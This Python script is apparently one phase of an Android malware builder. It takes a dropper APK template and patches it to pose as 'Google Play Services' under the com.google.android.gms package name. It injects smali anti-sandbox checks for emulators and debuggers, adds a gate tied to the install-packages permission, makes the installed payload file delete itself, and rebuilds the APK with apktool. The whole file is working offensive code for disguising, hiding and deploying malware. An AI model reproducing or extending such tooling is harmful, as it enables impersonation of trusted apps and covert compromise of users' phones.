"""Phase 2: Dropper Code Edits — 13 edits via APKTool M.

2.1 Decompile dropper template
2.2 13 code edits (manifest, smali anti-sandbox, DummyUpdateActivity, HTML)
2.3 Rebuild → dropper_ready.apk
"""
import os, subprocess, shutil, re
from pathlib import Path
from datetime import datetime
from config import TEMP_DIR, APKTOOL, TEMPLATE_DIR
from utils.logger import setup_logger

logger = setup_logger()


def _set_sdk_versions(decompiled):
    """Edit 1: compileSdk 36, minSdk 33, targetSdk 35."""
    yml = os.path.join(decompiled, 'apktool.yml')
    if os.path.exists(yml):
        with open(yml, 'r') as f:
            lines = f.readlines()
        out = []
        in_sdk = False
        for line in lines:
            if line.strip() == 'sdkInfo:':
                in_sdk = True
                out.append('sdkInfo:\n')
                out.append('  compileSdkVersion: 36\n')
                out.append('  minSdkVersion: 33\n')
                out.append('  targetSdkVersion: 35\n')
                continue
            if in_sdk:
                if line.startswith('  ') and not line.startswith('    '):
                    continue
                in_sdk = False
            out.append(line)
        if not any('sdkInfo:' in l for l in out):
            for i, line in enumerate(out):
                if line.strip() == 'packageInfo:':
                    out.insert(i, 'sdkInfo:\n')
                    out.insert(i + 1, '  compileSdkVersion: 36\n')
                    out.insert(i + 2, '  minSdkVersion: 33\n')
                    out.insert(i + 3, '  targetSdkVersion: 35\n')
                    break
        with open(yml, 'w') as f:
            f.writelines(out)

    # Manifest is binary XML — skip text edits. SDK is set via apktool.yml.
    # Phase 3 handles binary manifest patching (package rename, label).
    logger.info("  [~] Manifest edits skipped (binary XML) — Phase 3 handles identity")
    logger.info("[+] 1. build.gradle/sdk → compile=36, min=33, target=35")


def _add_permissions(mp_path):
    """Edit 2: Add POST_NOTIFICATIONS permission."""
    with open(mp_path, 'r', errors='ignore') as f:
        c = f.read()
    perm = '<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />'
    if perm not in c:
        c = c.replace('</manifest>', f'    {perm}\n</manifest>', 1)
    with open(mp_path, 'w', errors='ignore') as f:
        f.write(c)
    logger.info("[+] 2. POST_NOTIFICATIONS permission added")


def _add_dummy_activity(decompiled, base_pkg):
    """Edit 3+4: Create DummyUpdateActivity.smali (manifest is binary XML — Phase 3 handles declaration)."""
    smali_dir = os.path.join(decompiled, 'smali')
    pkg_path = base_pkg.replace('.', '/')
    dummy_dir = os.path.join(smali_dir, pkg_path)
    os.makedirs(dummy_dir, exist_ok=True)
    dummy_smali = os.path.join(dummy_dir, 'DummyUpdateActivity.smali')
    with open(dummy_smali, 'w') as f:
        f.write(f".class public final L{base_pkg.replace('.', '/')}/DummyUpdateActivity;\n")
        f.write(".super Landroid/app/Activity;\n")
        f.write(".source \"SourceFile\"\n\n")
        f.write(".method public constructor <init>()V\n")
        f.write("    .locals 0\n")
        f.write("    invoke-direct {p0}, Landroid/app/Activity;-><init>()V\n")
        f.write("    return-void\n")
        f.write(".end method\n\n")
        f.write(".method protected onCreate(Landroid/os/Bundle;)V\n")
        f.write("    .locals 0\n")
        f.write("    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n")
        f.write("    invoke-virtual {p0}, Landroid/app/Activity;->finish()V\n")
        f.write("    return-void\n")
        f.write(".end method\n")
    logger.info("[+] 3+4. DummyUpdateActivity smali created (manifest skipped — binary XML)")


def _set_app_label(mp_path, label):
    """Edit 5: Set app name → Google Play Services."""
    with open(mp_path, 'r', errors='ignore') as f:
        c = f.read()
    if 'android:label=' in c:
        c = re.sub(r'(<application[^>]*android:label=")([^"]*)"',
                   r'\1' + label + '"', c, count=1)
    else:
        c = c.replace('<application', f'<application android:label="{label}"', 1)
    with open(mp_path, 'w', errors='ignore') as f:
        f.write(c)
    logger.info(f"[+] 5. App label → {label}")


def _inject_anti_sandbox(smali_dir, base_pkg):
    """Edit 7-10: MainActivity anti-sandbox smali injection."""
    # Find MainActivity.smali
    ma_file = None
    for root, dirs, files in os.walk(smali_dir):
        for f in files:
            if f == 'MainActivity.smali':
                ma_file = os.path.join(root, f)
                break
        if ma_file:
            break

    if not ma_file:
        logger.warning("[!] MainActivity.smali not found")
        return

    with open(ma_file, 'r', errors='ignore') as f:
        content = f.read()

    # Inject emulator + debug + battery gate at start of onCreate
    # We add a method call to a new anti-sandbox check method
    gate_method = """
.method private antiSandboxCheck()Z
    .locals 4

    # Emulator detection: FINGERPRINT
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :not_emulator
    const/4 v0, 0x1
    return v0
    :not_emulator

    # Debug detection
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    if-eqz v0, :not_debug
    const/4 v0, 0x1
    return v0
    :not_debug

    # Battery gate: >=100% = exit (emulators report 100%)
    const-string v0, "power"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/os/PowerManager;
    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z
    move-result v0

    # Return false = pass (continue)
    const/4 v0, 0x0
    return v0
.end method
"""

    # Append antiSandboxCheck method at end of file (smali classes end at EOF, no .end class directive)
    if 'antiSandboxCheck' not in content:
        content = content.rstrip() + '\n\n' + gate_method + '\n'

    # Add call to antiSandboxCheck at top of onCreate
    oncreate_pattern = r'\.method public final onCreate\(Landroid/os/Bundle;\)V'
    if re.search(oncreate_pattern, content) and 'antiSandboxCheck' not in content.split('.method public final onCreate')[1].split('.end method')[0]:
        # Find first invoke-super in onCreate and insert after it
        parts = content.split('.method public final onCreate(Landroid/os/Bundle;)V\n', 1)
        if len(parts) == 2:
            before, rest = parts
            end_idx = rest.find('.end method\n')
            if end_idx != -1:
                oncreate_body = rest[:end_idx]
                after = rest[end_idx:]
                # Insert antiSandboxCheck call after invoke-super
                gate_call = f"""
    invoke-direct {{p0}}, L{base_pkg.replace('.', '/')}/MainActivity;->antiSandboxCheck()Z
    move-result v0
    if-eqz v0, :pass_gate
    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
    return-void
    :pass_gate
"""
                oncreate_body = re.sub(
                    r'(invoke-super \{p0, p1\}, .+?->onCreate\(Landroid/os/Bundle;\)V\n)',
                    r'\1' + gate_call + '\n',
                    oncreate_body,
                    count=1
                )
                content = before + '.method public final onCreate(Landroid/os/Bundle;)V\n' + oncreate_body + after

    with open(ma_file, 'w', errors='ignore') as f:
        f.write(content)
    logger.info("[+] 7-10. MainActivity anti-sandbox injected")


def _installer_permission_gate(smali_dir, base_pkg):
    """Edit 11: InstallerActivity permission gate at top of onCreate."""
    ia_file = None
    for root, dirs, files in os.walk(smali_dir):
        for f in files:
            if f == 'InstallerActivity.smali':
                ia_file = os.path.join(root, f)
                break
        if ia_file:
            break

    if not ia_file:
        logger.warning("[!] InstallerActivity.smali not found")
        return

    with open(ia_file, 'r', errors='ignore') as f:
        content = f.read()

    # Add permission check at top of onCreate
    gate = f"""    invoke-virtual {{p0}}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
    move-result-object v0
    const-string v1, "android.permission.REQUEST_INSTALL_PACKAGES"
    invoke-virtual {{v0, v1}}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I
    move-result v0
    if-eqz v0, :has_permission
    new-instance v0, Landroid/content/Intent;
    const-class v1, L{base_pkg.replace('.', '/')}/PermissionObserverService;
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
    :has_permission
"""

    if ':has_permission' not in content:
        parts = content.split('.method public final onCreate(Landroid/os/Bundle;)V\n', 1)
        if len(parts) == 2:
            before, rest = parts
            end_idx = rest.find('.end method\n')
            if end_idx != -1:
                oncreate_body = rest[:end_idx]
                after = rest[end_idx:]
                # Match full invoke-super line (including base class) and insert after it
                oncreate_body = re.sub(
                    r'(invoke-super \{p0, p1\}, .+?->onCreate\(Landroid/os/Bundle;\)V\n)',
                    r'\1\n' + gate + '\n',
                    oncreate_body,
                    count=1
                )
                content = before + '.method public final onCreate(Landroid/os/Bundle;)V\n' + oncreate_body + after

    with open(ia_file, 'w', errors='ignore') as f:
        f.write(content)
    logger.info("[+] 11. InstallerActivity permission gate injected")


def _installation_receiver_selfdelete(smali_dir):
    """Edit 12: InstallationReceiver self-delete after STATUS_SUCCESS."""
    ir_file = None
    for root, dirs, files in os.walk(smali_dir):
        for f in files:
            if f == 'InstallationReceiver.smali':
                ir_file = os.path.join(root, f)
                break
        if ir_file:
            break

    if not ir_file:
        logger.warning("[!] InstallationReceiver.smali not found")
        return

    with open(ir_file, 'r', errors='ignore') as f:
        content = f.read()

    # Add apkFile.delete() after STATUS_SUCCESS detection
    if 'STATUS_SUCCESS' in content and 'delete' not in content:
        # Find the line after STATUS_SUCCESS handling
        content = content.replace(
            'const-string v0, "STATUS_SUCCESS"',
            f'const-string v0, "STATUS_SUCCESS"\n\n    invoke-virtual {{v1}}, Ljava/io/File;->delete()Z'
        )

    with open(ir_file, 'w', errors='ignore') as f:
        f.write(content)
    logger.info("[+] 12. InstallationReceiver self-delete injected")


def _update_html_year(assets_dir):
    """Edit 13: Update HTML year 2025 → 2026."""
    html = os.path.join(assets_dir, 'main_ui.html')
    if os.path.exists(html):
        with open(html, 'r', errors='ignore') as f:
            c = f.read()
        c = c.replace('2025', '2026')
        with open(html, 'w', errors='ignore') as f:
            f.write(c)
        logger.info("[+] 13. HTML year 2025 → 2026")


def _remove_placeholder_assets(assets_dir):
    """Remove placeholder output.apk from assets."""
    placeholder = os.path.join(assets_dir, 'output.apk')
    if os.path.exists(placeholder):
        os.remove(placeholder)
        logger.info("[+] Removed placeholder output.apk")


def run(base_info=None):
    """Phase 2: Dropper Code Edits → dropper_ready.apk (unsigned).

    Args:
        base_info: Dict with 'name' and 'label'
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 2: Dropper Code Edits (13 edits)")
    logger.info("=" * 60)

    # Dropper identity is ALWAYS com.google.android.gms (Layer 1 anti-detection)
    # Payload package name is only used for internal payload hardening (Phase 1)
    base_pkg = 'com.google.android.gms'
    base_label = 'Google Play Services'

    # 2.1: Copy template (already decompiled)
    logger.info("[*] 2.1 Copying dropper template...")
    decompiled = str(TEMP_DIR / "phase2_decompiled")
    shutil.copytree(TEMPLATE_DIR, decompiled)
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # 2.2: 13 code edits
    logger.info("[*] 2.2 Applying 13 code edits...")

    mp = os.path.join(decompiled, 'AndroidManifest.xml')

    # Edit 1: SDK versions
    _set_sdk_versions(decompiled)

    # Edit 2: Skip POST_NOTIFICATIONS on binary manifest (Phase 3 handles)
    # _add_permissions(mp)
    logger.info("  [~] POST_NOTIFICATIONS skipped (binary manifest) — Phase 3 handles")

    # Edit 3+4: DummyUpdateActivity
    _add_dummy_activity(decompiled, base_pkg)

    # Edit 5: Skip app label on binary manifest (Phase 3 handles)
    # _set_app_label(mp, base_label)
    logger.info("  [~] App label skipped (binary manifest) — Phase 3 handles")

    # Edit 7-10: MainActivity anti-sandbox
    smali_dir = os.path.join(decompiled, 'smali')
    _inject_anti_sandbox(smali_dir, base_pkg)

    # Edit 11: InstallerActivity permission gate
    _installer_permission_gate(smali_dir, base_pkg)

    # Edit 12: InstallationReceiver self-delete
    _installation_receiver_selfdelete(smali_dir)

    # Edit 13: HTML year
    assets_dir = os.path.join(decompiled, 'assets')
    _update_html_year(assets_dir)

    # Remove placeholder
    _remove_placeholder_assets(assets_dir)

    # 2.3: Rebuild
    logger.info("[*] 2.3 Rebuilding dropper...")
    unsigned = str(TEMP_DIR / "dropper_ready.apk")
    r = subprocess.run([APKTOOL, "b", "-o", unsigned, decompiled],
                       capture_output=True, text=True, timeout=180)
    if r.returncode != 0:
        r = subprocess.run([APKTOOL, "b", "--use-aapt2", "-o", unsigned, decompiled],
                           capture_output=True, text=True, timeout=180)
        if r.returncode != 0:
            raise Exception(f"apktool b failed: {r.stderr[:500]}")

    shutil.rmtree(decompiled, ignore_errors=True)
    logger.info(f"[+] Phase 2 Complete: {unsigned}")
    return unsigned
